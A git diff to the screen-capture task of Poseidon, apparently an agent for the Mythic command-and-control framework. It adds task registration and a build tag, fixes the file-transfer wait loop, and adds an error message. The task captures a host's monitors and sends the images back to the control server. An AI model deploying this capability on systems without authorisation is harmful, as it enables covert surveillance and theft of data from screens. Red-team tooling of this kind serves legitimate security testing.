@@ -1,3 +1,5 @@
+//go:build screencapture || debug
+
 package screencapture
 
 import (
@@ -7,8 +9,13 @@ import (
 
 	"strconv"
 
+	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pkg/tasks/taskRegistrar"
 	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pkg/utils/structs"
 )
+
+func init() {
+	taskRegistrar.Register("screencapture", Run)
+}
 
 // ScreenShot - interface for holding screenshot data
 type ScreenShot interface {
@@ -33,7 +40,7 @@ func Run(task structs.Task) {
 		screenShotMsg.IsScreenshot = true
 		screenShotData := result[i].Data()
 		screenShotMsg.Data = &screenShotData
-		screenShotMsg.FileName = "Monitor " + strconv.Itoa(result[i].Monitor())
+		screenShotMsg.FileName = "Monitor-" + strconv.Itoa(result[i].Monitor())
 		screenShotMsg.FullPath = ""
 		screenShotMsg.FinishedTransfer = finishedTransfer
 		task.Job.SendFileToMythic <- screenShotMsg
@@ -41,14 +48,17 @@ func Run(task structs.Task) {
 	filesFinished := 0
 	for {
 		// just pull the next thing off of the finishedTransfer channel to indicate we finished transferring a file
-		<-finishedTransfer
-		filesFinished++
-		if filesFinished == len(result) {
+		if filesFinished >= len(result) {
 			break
 		}
+		<-finishedTransfer
+		filesFinished++
 	}
 	msg.Completed = true
 	msg.Status = "completed"
+	if filesFinished == 0 {
+		msg.SetError("No monitors captured")
+	}
 	task.Job.SendResponses <- msg
 	return
 }
